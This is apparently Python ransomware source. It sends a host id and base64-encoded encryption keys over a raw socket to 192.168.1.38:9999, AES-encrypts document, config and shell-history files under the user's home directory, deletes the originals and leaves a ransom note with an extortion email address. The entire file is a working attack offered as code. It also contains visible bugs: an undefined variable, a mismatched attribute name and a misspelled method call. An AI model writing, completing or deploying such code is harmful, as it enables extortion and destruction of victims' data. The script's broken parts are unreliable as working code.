#!/usr/bin/env python3
import sys
import os
import platform
import hashlib
import string

connection=('192.168.1.38',9999)

def align_buffer(buffer):
 y=16-(len(buffer)%16)
 buffer+=bytes([y])*y
 return buffer


def w(u):
 u=u[:-u[-1]]
 return u


file_types=['.doc','.txt','.rc','.ini','.dat','.conf','_history']


class encrypter():

 def __init__(self):
  platform_string=platform.node()+'//'+platform.platform()
  home_dir=os.environ['HOME']
  user_name=home_dir.split('/')[-1]
  platform_machine=platform.machine()
  platform_system=platform.system()
  if not d:
   import getpass
   user_name=getpass.getuser()
   home_dir='/home/'+user_name
  text_to_hash=':'.join(x for x in[platform_string,platform_machine,platform_system,user_name,home_dir])
  self.id=hashlib.sha256(text_to_hash.encode('utf8')).hexdigest()
  self.system=platform_system
  self.machine=platform_machine
  self.user=user_name
  self.home=home_dir
  if "linux" in sys.platform:
   self.platform=0
  elif "darwin" in sys.platform:
   self.platform=1
  elif "win32" in sys.platform:
   self.platform=2

  try:
   f=open('/tmp/.X11.'+self.id,'r')
   self.infected=True
  except FileNotFoundError:
   f=open('/tmp/.X11.'+self.id,'w')
   self.infected=False
   f.write(self.id)
  f.close()


 def encrypt_file(self,aes,filename):
    try:
         f=open(filename,'rb')
         dump=f.read()
         f.close()
         dump=align_buffer(dump)
         encrypted=aes.encrypt(dump)
         f=open(filename+'.enc','wb')
         f.write(encrypted)
         f.close()
         os.remove(filename)
    except:
        pass

 def encrypt_all(self):
  import socket
  import random
  import base64
  seed_dict=[]
  for x in range(16):
   seed_line=''.join(random.choices(string.ascii_letters,k=16))
   seed_dict.append(seed_line)
  u=','.join(k for k in seed_dict)
  u=bytes(u,"utf-8")
  u=base64.b64encode(u)

  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#connect to 192.168.1.38:9999
  s.connect(connection)
#send id
  s.sendall(bytes(self.id,"utf-8"))
  s.recv(1)
#send seed
  s.sendall(u)

  from Crypto.Cipher import AES
#encrypt just with last seed line
  aes=AES.new(seed_line,AES.MODE_ECB)
  for(dirpath,dirnames,filenames)in os.walk(self.home):
   if '.ssh' not in dirnames:
    for fn in filenames:
     for e in file_types:
      if fn.endswith(e):
       self.encrypt_file(aes,dirpath+'/'+fn)
       break
  f=open(self.home+'/message','wb')
  f.write(bytes('All your files was encrypted\n. Contact Ywe23z3565yrgbv@protonmail.com for information(mention IP address on theme)\n','utf-8'))
  f.close()


enc=encrypter()
if enc.platform!=0:
 exit(-1)

if enc.inf:
 exit(0)

enc.enctypt_all()
